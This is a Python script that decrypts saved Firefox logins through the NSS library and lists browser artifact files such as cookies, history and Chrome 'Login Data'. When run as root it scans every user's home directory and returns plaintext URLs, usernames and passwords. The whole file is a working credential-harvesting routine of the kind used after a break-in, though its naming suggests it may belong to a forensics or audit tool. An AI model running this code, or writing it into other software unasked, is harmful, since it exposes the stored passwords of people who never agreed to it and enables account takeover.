import os
import json
import base64
import ctypes
from ctypes import POINTER, c_void_p, c_int, c_char_p, c_uint, c_ubyte, Structure, byref

class SECItem(ctypes.Structure):
	_fields_ = [
		("type", c_uint),
		("data", POINTER(c_ubyte)),
		("len",  c_uint),
	]

def init_nss(profile_path):
	try:
		nss = ctypes.CDLL("libnss3.so")
	except OSError:
		return None, None

	nss.NSS_Init.argtypes = [c_char_p]
	nss.NSS_Init.restype  = c_int
	nss.PK11_GetInternalKeySlot.restype = c_void_p
	nss.PK11_CheckUserPassword.argtypes = [c_void_p, c_char_p]
	nss.PK11_CheckUserPassword.restype  = c_int
	nss.PK11_FreeSlot.argtypes          = [c_void_p]
	nss.PK11SDR_Decrypt.argtypes        = [POINTER(SECItem), POINTER(SECItem), c_void_p]
	nss.PK11SDR_Decrypt.restype         = c_int
	nss.NSS_Shutdown.restype            = c_int

	db_path = f"sql:{profile_path}"
	if nss.NSS_Init(db_path.encode("utf-8")) != 0:
		return None, None

	slot = nss.PK11_GetInternalKeySlot()
	if not slot:
		nss.NSS_Shutdown()
		return None, None

	if nss.PK11_CheckUserPassword(slot, b"") != 0:
		pwd = input(f"Master password for {profile_path}: ").encode()
		if nss.PK11_CheckUserPassword(slot, pwd) != 0:
			nss.PK11_FreeSlot(slot)
			nss.NSS_Shutdown()
			return None, None

	return nss, slot

def decrypt_data(nss, enc):
	if not enc:
		return None
	try:
		decoded = base64.b64decode(enc)
	except Exception:
		return None

	inp      = SECItem()
	inp.type = 0
	inp.data = (c_ubyte * len(decoded))(*decoded)
	inp.len  = len(decoded)

	out      = SECItem()
	out.type = 0
	out.data = None
	out.len  = 0

	if nss.PK11SDR_Decrypt(byref(inp), byref(out), None) != 0:
		return None

	try:
		return ctypes.string_at(out.data, out.len).decode("utf-8")
	except Exception:
		return None

def get_firefox_profiles():
	base_paths = []

	base_paths.append(os.path.expanduser("~/.mozilla/firefox"))

	if os.geteuid() == 0:
		for user_dir in os.listdir("/home"):
			path = f"/home/{user_dir}/.mozilla/firefox"
			if os.path.exists(path):
				base_paths.append(path)
		base_paths.append("/root/.mozilla/firefox")

	profiles = []
	for base in base_paths:
		if not os.path.exists(base):
			continue
		for d in os.listdir(base):
			full = os.path.join(base, d)
			if os.path.isdir(full) and os.path.exists(os.path.join(full, "key4.db")):
				profiles.append(full)

	return profiles

def parse_browser_artifacts():
	home = os.path.expanduser("~")

	browser_locations = {
		"Google Chrome": f"{home}/.config/google-chrome",
		"Chromium":      f"{home}/.config/chromium",
		"Firefox":       f"{home}/.mozilla/firefox",
		"Brave":         f"{home}/.config/BraveSoftware/Brave-Browser",
	}

	important_files = [
		"Login Data",
		"Cookies",
		"History",
		"Web Data",
		"Bookmarks",
		"places.sqlite",
		"key4.db",
		"logins.json",
	]

	artifact_findings = []
	cred_findings     = []

	for browser, base_path in browser_locations.items():
		if not os.path.exists(base_path):
			continue
		artifact_findings.append((base_path, f"{browser} profile detected"))
		for root, dirs, files in os.walk(base_path):
			for file in files:
				if file not in important_files:
					continue
				artifact_findings.append((os.path.join(root, file), f"Browser artifact: {file}"))

	for profile in get_firefox_profiles():
		logins_path = os.path.join(profile, "logins.json")
		if not os.path.exists(logins_path):
			continue
		nss, slot = init_nss(profile)
		if not nss:
			artifact_findings.append((profile, "NSS init failed"))
			continue
		try:
			with open(logins_path, "r") as f:
				data = json.load(f)
			for entry in data.get("logins", []):
				enc_user = entry.get("encryptedUsername")
				enc_pass = entry.get("encryptedPassword")
				if not enc_user or not enc_pass:
					continue
				user   = decrypt_data(nss, enc_user)
				passwd = decrypt_data(nss, enc_pass)
				url    = entry.get("hostname", "unknown")
				if user and passwd:
					cred_findings.append((logins_path, f"URL: {url} | User: {user} | Pass: {passwd}"))
		except Exception:
			artifact_findings.append((logins_path, "Failed to parse logins.json"))
		finally:
			nss.PK11_FreeSlot(slot)
			nss.NSS_Shutdown()

	if not cred_findings:
		cred_findings.append(("N/A", "No decrypted credentials found"))

	return cred_findings
